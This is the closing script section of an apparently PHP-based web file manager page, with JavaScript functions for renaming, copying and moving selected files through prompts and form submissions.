// === SINGLE RENAME ===
function singleRename(path) {
    let newName = prompt('Enter new name:');
    if(newName) {
        window.location.href = '?action=rename&old=' + path + '&new=' + encodeURIComponent(newName) + '&dir=<?= urlencode($cwd) ?>';
    }
}

// === MASS RENAME ===
function massRename() {
    let files = document.querySelectorAll('input[name="files[]"]:checked');
    if(files.length === 0) { showToast('Select files first', true); return; }
    let newNames = [];
    let valid = true;
    files.forEach(cb => {
        let newName = prompt('New name for ' + cb.value, cb.value);
        if(newName === null) { valid = false; return; }
        newNames.push(newName);
    });
    if(!valid || newNames.length === 0) return;
    let form = document.getElementById('massActionForm');
    form.action = '?dir=<?= urlencode($cwd) ?>&action=mass_rename';
    form.querySelectorAll('input[name="new_names[]"]').forEach(el => el.remove());
    newNames.forEach(n => {
        let inp = document.createElement('input');
        inp.type = 'hidden';
        inp.name = 'new_names[]';
        inp.value = n;
        form.appendChild(inp);
    });
    form.submit();
}

// === MASS COPY ===
function massCopy() {
    let files = document.querySelectorAll('input[name="files[]"]:checked');
    if(files.length === 0) { showToast('Select files first', true); return; }
    let dest = prompt('Destination directory (relative):');
    if(!dest) return;
    let form = document.getElementById('massActionForm');
    form.action = '?dir=<?= urlencode($cwd) ?>&action=mass_copy';
    document.getElementById('massDestDir').value = dest;
    form.submit();
}

// === MASS MOVE ===
function massMove() {
    let files = document.querySelectorAll('input[name="files[]"]:checked');
    if(files.length === 0) { showToast('Select files first', true); return; }
    let dest = prompt('Destination directory (relative):');
    if(!dest) return;
    let form = document.getElementById('massActionForm');
    form.action = '?dir=<?= urlencode($cwd) ?>&action=mass_move';
    document.getElementById('massDestDir').value = dest;
    form.submit();
}
</script>
</body>
</html>
